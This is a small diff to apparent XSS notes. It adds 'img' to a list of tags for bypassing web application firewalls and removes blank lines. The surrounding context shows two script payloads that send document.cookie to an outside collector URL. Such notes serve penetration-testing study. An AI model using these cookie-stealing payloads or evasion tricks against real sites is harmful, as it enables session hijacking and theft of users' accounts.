@@ -22,7 +22,7 @@ Bypassing WAF:
 1. Case insensitivity
 2. URL encoding some special characters
 3. Extra open brackets
-4. Alternatives of script are - iframe, body, svg
+4. Alternatives of script are - iframe, body, svg, img
 5. Use eval
 
 ## Payloads
@@ -109,7 +109,4 @@ https://owasp.org/www-community/xss-filter-evasion-cheatsheet
 <script>document.location="https://requestbin/?q="+document.cookie</script>
 
 <script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
-
-
-
 ```
